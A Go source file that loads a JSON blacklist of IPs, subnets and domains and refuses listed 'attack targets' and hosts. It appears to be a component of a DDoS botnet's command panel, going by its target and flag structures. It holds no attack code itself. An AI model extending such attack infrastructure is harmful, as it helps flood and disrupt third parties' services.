package main

import (
    "encoding/json"
    "fmt"
    "net"
    "os"
    "strings"
    "sync"
)

type BlacklistEntry struct {
    CIDR    *net.IPNet
    Domain  string
    isSuffix bool
}

type BlacklistConfig struct {
    IPs     []string `json:"ips"`
    Subnets []string `json:"subnets"`
    Domains []string `json:"domains"`
}

var (
    blacklistEntries []BlacklistEntry
    blacklistMutex   sync.RWMutex
    blacklistLoaded  bool
)

func isTargetBlacklisted(targetIP uint32, netmask uint8, domain string) (bool, string) {
    blacklistMutex.RLock()
    defer blacklistMutex.RUnlock()

    if !blacklistLoaded {
        return false, ""
    }

    for _, entry := range blacklistEntries {
        if entry.CIDR != nil && targetIP != 0 {
            ip := make(net.IP, 4)
            ip[0] = byte(targetIP >> 24)
            ip[1] = byte(targetIP >> 16)
            ip[2] = byte(targetIP >> 8)
            ip[3] = byte(targetIP)
            if entry.CIDR.Contains(ip) {
                return true, entry.CIDR.String()
            }
        }
        if entry.Domain != "" && domain != "" {
            if entry.isSuffix {
                if strings.HasSuffix(domain, entry.Domain) {
                    return true, entry.Domain
                }
            } else if domain == entry.Domain {
                return true, entry.Domain
            }
        }
    }
    return false, ""
}

func loadBlacklist(filename string) error {
    file, err := os.Open(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    var cfg BlacklistConfig
    if err := json.NewDecoder(file).Decode(&cfg); err != nil {
        return err
    }

    var entries []BlacklistEntry

    for _, ipStr := range cfg.IPs {
        ip := net.ParseIP(ipStr)
        if ip == nil {
            continue
        }
        if ipv4 := ip.To4(); ipv4 != nil {
            mask := net.CIDRMask(32, 32)
            cidr := &net.IPNet{IP: ipv4, Mask: mask}
            entries = append(entries, BlacklistEntry{CIDR: cidr})
        }
    }

    for _, subnetStr := range cfg.Subnets {
        _, cidr, err := net.ParseCIDR(subnetStr)
        if err != nil {
            continue
        }
        entries = append(entries, BlacklistEntry{CIDR: cidr})
    }

    for _, domainStr := range cfg.Domains {
        domainStr = strings.TrimSpace(domainStr)
        if domainStr == "" {
            continue
        }
        isSuffix := strings.HasPrefix(domainStr, ".")
        entries = append(entries, BlacklistEntry{
            Domain:   domainStr,
            isSuffix: isSuffix,
        })
    }

    blacklistMutex.Lock()
    blacklistEntries = entries
    blacklistLoaded = true
    blacklistMutex.Unlock()

    return nil
}

func checkAttackTargets(targets map[uint32]uint8, flags map[uint8]string) error {
    for prefix, netmask := range targets {
        blocked, reason := isTargetBlacklisted(prefix, netmask, "")
        if blocked {
            ip := fmt.Sprintf("%d.%d.%d.%d/%d",
                byte(prefix>>24), byte(prefix>>16), byte(prefix>>8), byte(prefix), netmask)
            return fmt.Errorf("target %s is blacklisted (matches: %s)", ip, reason)
        }
    }

    if domain, ok := flags[8]; ok && domain != "" {
        blocked, reason := isTargetBlacklisted(0, 0, domain)
        if blocked {
            return fmt.Errorf("domain %s is blacklisted (matches: %s)", domain, reason)
        }
    }

    if host, ok := flags[22]; ok && host != "" {
        blocked, reason := isTargetBlacklisted(0, 0, host)
        if blocked {
            return fmt.Errorf("host %s is blacklisted (matches: %s)", host, reason)
        }
    }

    return nil
}
